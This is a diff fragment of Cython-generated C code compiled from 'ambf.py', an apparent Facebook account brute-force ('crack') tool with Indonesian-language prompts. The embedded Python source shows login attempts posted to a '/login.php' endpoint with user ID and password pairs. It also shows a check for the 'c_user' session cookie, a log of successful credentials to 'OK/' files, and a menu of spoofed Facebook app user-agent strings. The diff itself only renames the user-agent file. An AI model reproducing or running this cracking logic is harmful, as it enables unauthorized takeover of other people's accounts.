  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))
  * 				break
@@ -19277,7 +19244,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
           __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
 
           /* "ambf.py":572
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  * 				ok.append("%s|%s"%(uid, pw))
  * 				open("OK/%s.txt"%(tanggal),"a").write("  * --> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
  * 				break
@@ -19367,7 +19334,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 			b = ses.post(host+"/login.php", data={"email": uid, "pass": pw, "login": "submit"})
  * 			if "c_user" in ses.cookies.get_dict().keys():             # <<<<<<<<<<<<<<
  * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
- * 				print("\r  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
+ * 				print("  \033[0;92m* --> %s|%s\033[0;97m          "%(uid, pw))
  */
         }
 
@@ -20574,7 +20541,7 @@ static PyObject *__pyx_pf_4ambf_26crack(CYTHON_UNUSED PyObject *__pyx_self, PyOb
  * 
  * def crack(uid, pwx, host):             # <<<<<<<<<<<<<<
  * 	try:
- * 		ua = open(".ua", "r").read()
+ * 		ua = open("useragent_.txt", "r").read()
  */
 
   /* function exit code */
@@ -20993,7 +20960,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["1", "01"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21014,7 +20981,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Linux_Android_10_Mi);
@@ -21023,9 +20990,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":628
  * 	elif ua in ["1", "01"]:
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 628, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
@@ -21051,9 +21018,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":629
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 629, __pyx_L1_error)
@@ -21079,9 +21046,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":630
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21115,7 +21082,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":631
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["2", "02"]:
@@ -21125,7 +21092,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":632
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["2", "02"]:
@@ -21155,7 +21122,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["1", "01"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -21165,7 +21132,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["2", "02"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21186,7 +21153,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["2", "02"]:
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_Dalvik_2_1_0_Linux_U_Android_11);
@@ -21195,9 +21162,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":635
  * 	elif ua in ["2", "02"]:
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 635, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
@@ -21223,9 +21190,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":636
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 636, __pyx_L1_error)
@@ -21251,9 +21218,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":637
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21287,7 +21254,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":638
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["3", "03"]:
@@ -21297,7 +21264,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":639
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["3", "03"]:
@@ -21327,7 +21294,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["2", "02"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/2.1.0 (Linux; U; Android 11; SM-F700W Build/RP1A.200720.012; wv) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -21337,7 +21304,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["3", "03"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21358,7 +21325,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["3", "03"]:
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_FBAN_FB4A_FBAV_276_0_0_44_127_F);
@@ -21367,9 +21334,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":642
  * 	elif ua in ["3", "03"]:
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 642, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
@@ -21395,9 +21362,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":643
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_time); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 643, __pyx_L1_error)
@@ -21423,9 +21390,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":644
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21459,7 +21426,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":645
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["4", "04"]:
@@ -21469,7 +21436,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":646
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["4", "04"]:
@@ -21499,7 +21466,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["3", "03"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("[FBAN/FB4A;FBAV/276.0.0.44.127;FBBV/225129382;FBDM/{density=2.0,width=720,height=1344};FBLC/en_US;FBRV/227665120;FBCR/AT&amp-T;FBMF/Nokia 7 plus;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7 plus;FBSV/9;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -21509,7 +21476,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["4", "04"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21530,7 +21497,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["4", "04"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_Dalvik_1_6_0_Linux_U_Android_4_4);
@@ -21539,9 +21506,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":649
  * 	elif ua in ["4", "04"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_4 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 649, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_4);
@@ -21567,9 +21534,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":650
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)             # <<<<<<<<<<<<<<
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  */
     __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_time); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 650, __pyx_L1_error)
@@ -21595,9 +21562,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":651
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))             # <<<<<<<<<<<<<<
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))             # <<<<<<<<<<<<<<
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()
  */
@@ -21631,7 +21598,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":652
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")             # <<<<<<<<<<<<<<
  * 		menu()
  * 	elif ua in ["5", "05"]:
@@ -21641,7 +21608,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
 
     /* "ambf.py":653
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  * 		input("\n [+] berhasil ganti user agent")
  * 		menu()             # <<<<<<<<<<<<<<
  * 	elif ua in ["5", "05"]:
@@ -21671,7 +21638,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["4", "04"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
     goto __pyx_L3;
   }
@@ -21681,7 +21648,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["5", "05"]:             # <<<<<<<<<<<<<<
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  */
   __Pyx_INCREF(__pyx_v_ua);
   __pyx_t_1 = __pyx_v_ua;
@@ -21702,7 +21669,7 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
  * 		menu()
  * 	elif ua in ["5", "05"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")             # <<<<<<<<<<<<<<
- * 		open(".ua", "w").write(c_ua)
+ * 		open("useragent_.txt", "w").write(c_ua)
  * 		time.sleep(1)
  */
     __Pyx_INCREF(__pyx_kp_u_Dalvik_1_6_0_Linux_U_Android_4_4_2);
@@ -21711,9 +21678,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
     /* "ambf.py":656
  * 	elif ua in ["5", "05"]:
  * 		c_ua = ("Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/id_ID;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]")
- * 		open(".ua", "w").write(c_ua)             # <<<<<<<<<<<<<<
+ * 		open("useragent_.txt", "w").write(c_ua)             # <<<<<<<<<<<<<<
  * 		time.sleep(1)
- * 		print(" [+] user-agent : %s"%(open(".ua", "r").read()))
+ * 		print(" [+] user-agent : %s"%(open("useragent_.txt", "r").read()))
  */
     __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__114, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 656, __pyx_L1_error)
     __Pyx_GOTREF(__pyx_t_3);
@@ -21739,9 +21706,9 @@ static PyObject *__pyx_pf_4ambf_32setting_ua(CYTHON_UNUSED PyObject *__pyx_self)
 
     /* "ambf.py":657
